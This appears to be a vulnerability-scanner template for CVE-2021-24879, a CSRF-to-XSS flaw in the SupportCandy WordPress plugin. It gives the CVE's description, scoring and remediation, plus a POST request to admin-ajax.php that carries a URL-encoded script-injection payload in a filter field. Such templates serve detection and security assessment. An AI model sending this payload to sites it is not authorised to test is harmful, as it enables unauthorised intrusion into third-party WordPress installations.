id: CVE-2021-24879

info:
  name: SupportCandy < 2.2.7 CSRF to XSS Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: The SupportCandy WordPress plugin before 2.2.7 does not have CSRF check in the wpsc_tickets AJAX action, nor has any sanitisation or escaping in some of the filter fields which could allow attackers to make a logged in user having access to the ticket lists dashboard set an arbitrary filter (stored in their cookies) with an XSS payload in it.
  impact: |
    Successful exploitation could lead to unauthorized actions performed on behalf of the user or theft of sensitive information.
  remediation: |
    Upgrade SupportCandy to version 2.2.7 or later to mitigate the CSRF to XSS vulnerability.
  reference:
    - https://wpscan.com/vulnerability/6dfb4f61-c8cb-40ad-812f-139482be0fb4
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2021-24879
    cwe-id: CWE-352
    epss-score: 0.00087
    epss-percentile: 0.38629
    cpe: cpe:2.3:a:supportcandy:supportcandy:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: supportcandy
    product: supportcandy
    framework: wordpress
  tags: wpscan

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      action=wpsc_tickets&setting_action=set_custom_filter&page_no=1&custom_filter[s]=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
    matchers:
      - type: word
        words:
          - "Congratulations! You have triggered the XSS"
        part: body
